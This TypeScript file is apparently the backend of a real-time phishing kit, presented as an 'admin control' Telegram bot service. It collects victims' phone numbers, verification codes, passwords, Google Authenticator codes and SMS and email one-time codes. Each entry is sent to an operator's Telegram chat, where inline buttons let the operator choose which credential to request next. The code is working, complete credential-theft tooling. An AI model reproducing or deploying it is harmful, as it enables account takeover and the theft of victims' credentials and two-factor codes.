// Enhanced Telegram Bot API Service for Admin Control System

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";

interface UserSession {
  sessionId: string;
  phoneNumber: string;
  messageId?: number;
  startTime: string;
  phoneVerificationCode?: string;
  completedSteps: string[];
  currentStep: string;
  authAttempts: {
    [key: string]: number;
  };
  authCodes: {
    [key: string]: string[];
  };
}

// Store active sessions (in real app, this would be in a database)
const activeSessions = new Map<string, UserSession>();

/**
 * Generate unique session ID
 */
export const generateSessionId = (): string => {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
};

/**
 * Send initial phone number to Telegram with admin controls
 */
export const sendPhoneToTelegramEnhanced = async (
  phoneNumber: string,
): Promise<{ success: boolean; sessionId: string }> => {
  const sessionId = generateSessionId();

  try {
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
    };

    const message = formatInitialMessage(session);

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [], // No buttons initially
          },
        }),
      },
    );

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    const result = await response.json();
    session.messageId = result.result.message_id;

    // Store session
    activeSessions.set(sessionId, session);

    console.log("✅ Phone number sent to Telegram:", result);
    return { success: true, sessionId };
  } catch (error) {
    console.error("❌ Failed to send phone to Telegram:", error);
    return { success: false, sessionId };
  }
};

/**
 * Update session when user enters verification code
 */
export const updatePhoneVerificationCode = async (
  sessionId: string,
  verificationCode: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.error("Session not found:", sessionId);
      return false;
    }

    session.phoneVerificationCode = verificationCode;
    session.completedSteps.push("phone_verification");
    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    await updateTelegramMessage(
      session.messageId!,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to update verification code:", error);
    return false;
  }
};

/**
 * Update session with auth step data
 */
export const updateAuthStep = async (
  sessionId: string,
  stepType: string,
  stepData: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.error("Session not found:", sessionId);
      return false;
    }

    // Initialize auth attempts and codes for this step
    if (!session.authAttempts[stepType]) {
      session.authAttempts[stepType] = 0;
    }
    if (!session.authCodes[stepType]) {
      session.authCodes[stepType] = [];
    }

    session.authAttempts[stepType]++;
    session.authCodes[stepType].push(stepData);

    if (!session.completedSteps.includes(stepType)) {
      session.completedSteps.push(stepType);
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    await updateTelegramMessage(
      session.messageId!,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to update auth step:", error);
    return false;
  }
};

/**
 * Set user current step (when navigating to auth pages)
 */
export const setUserCurrentStep = async (
  sessionId: string,
  step: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) return false;

    session.currentStep = step;

    const updatedMessage = formatInitialMessage(session);
    // Remove admin buttons when user is not on loading page
    await updateTelegramMessage(session.messageId!, updatedMessage, {
      inline_keyboard: [],
    });

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to set current step:", error);
    return false;
  }
};

/**
 * Check if user can access auth step (prevent duplicate access)
 */
export const canAccessAuthStep = (
  sessionId: string,
  stepType: string,
): boolean => {
  const session = activeSessions.get(sessionId);
  if (!session) return false;

  // Allow access if this is the first time OR if it's SMS and this is the second attempt
  if (stepType === "sms") {
    return (
      !session.authAttempts[stepType] || session.authAttempts[stepType] < 2
    );
  }

  return (
    !session.authAttempts[stepType] || session.authAttempts[stepType] === 0
  );
};

/**
 * Get session data
 */
export const getSession = (sessionId: string): UserSession | undefined => {
  return activeSessions.get(sessionId);
};

/**
 * Format initial message with all session data
 */
const formatInitialMessage = (session: UserSession): string => {
  let message = `
🔔 <b>درخواست ورود جدید</b>

📱 <b>شماره همراه:</b> <code>${session.phoneNumber}</code>
🆔 <b>Session ID:</b> <code>${session.sessionId}</code>
⏰ <b>زمان شروع:</b> ${session.startTime}
📍 <b>وضعیت فعلی:</b> ${getCurrentStepText(session.currentStep)}

`;

  // Add phone verification code if exists
  if (session.phoneVerificationCode) {
    message += `✅ <b>کد تایید شماره:</b> <code>${session.phoneVerificationCode}</code>\n`;
  }

  // Add auth steps data
  Object.keys(session.authCodes).forEach((stepType) => {
    const codes = session.authCodes[stepType];
    const attempts = session.authAttempts[stepType] || 0;

    message += `\n🔐 <b>${getStepDisplayName(stepType)}:</b>\n`;

    codes.forEach((code, index) => {
      message += `   ${index + 1}. <code>${code}</code>\n`;
    });
  });

  message += `\n📊 <b>مراحل تکمیل شده:</b> ${session.completedSteps.length}`;
  message += `\n🕐 <b>آخرین به‌روزرسانی:</b> ${new Date().toLocaleString("fa-IR")}`;

  return message.trim();
};

/**
 * Get admin keyboard based on session state
 */
const getAdminKeyboard = (sessionId: string, session: UserSession) => {
  // Only show buttons if user is on loading page
  if (session.currentStep !== "waiting_admin") {
    return { inline_keyboard: [] };
  }

  const buttons = [];

  // Password button
  if (!session.authAttempts["password"]) {
    buttons.push([
      {
        text: "🔒 Password",
        callback_data: `auth_password_${sessionId}`,
      },
    ]);
  }

  // Google Auth button
  if (!session.authAttempts["google"]) {
    buttons.push([
      {
        text: "📱 Google Auth",
        callback_data: `auth_google_${sessionId}`,
      },
    ]);
  }

  // SMS Code button (allow up to 2 attempts)
  if (!session.authAttempts["sms"] || session.authAttempts["sms"] < 2) {
    buttons.push([
      {
        text: "💬 SMS Code",
        callback_data: `auth_sms_${sessionId}`,
      },
    ]);
  }

  // Email Code button
  if (!session.authAttempts["email"]) {
    buttons.push([
      {
        text: "📧 Email Code",
        callback_data: `auth_email_${sessionId}`,
      },
    ]);
  }

  // Complete Auth button (if user has completed at least one additional step)
  if (session.completedSteps.length > 1) {
    buttons.push([
      {
        text: "✅ تکمیل احراز هویت",
        callback_data: `complete_auth_${sessionId}`,
      },
    ]);
  }

  return { inline_keyboard: buttons };
};

/**
 * Update Telegram message
 */
const updateTelegramMessage = async (
  messageId: number,
  text: string,
  replyMarkup: any,
): Promise<void> => {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          message_id: messageId,
          text: text,
          parse_mode: "HTML",
          reply_markup: replyMarkup,
        }),
      },
    );

    if (!response.ok) {
      throw new Error(`Failed to update message: ${response.status}`);
    }
  } catch (error) {
    console.error("❌ Failed to update Telegram message:", error);
  }
};

/**
 * Get current step display text
 */
const getCurrentStepText = (step: string): string => {
  const stepTexts: { [key: string]: string } = {
    phone_verification: "در انتظار کد تایید شماره",
    waiting_admin: "در انتظار دستور ادمین",
    auth_password: "وارد کردن رمز عبور",
    auth_google: "وارد کردن کد Google Auth",
    auth_sms: "وارد کردن کد پیامک",
    auth_email: "وارد کردن کد ایمیل",
    completed: "تکمیل شده",
  };

  return stepTexts[step] || step;
};

/**
 * Get step display name
 */
const getStepDisplayName = (stepType: string): string => {
  const names: { [key: string]: string } = {
    password: "رمز عبور",
    google: "Google Authenticator",
    sms: "کد پیامک",
    email: "کد ایمیل",
  };

  return names[stepType] || stepType;
};

/**
 * Validate Telegram configuration
 */
export const validateTelegramConfig = (): boolean => {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
    return false;
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
    return false;
  }

  return true;
};
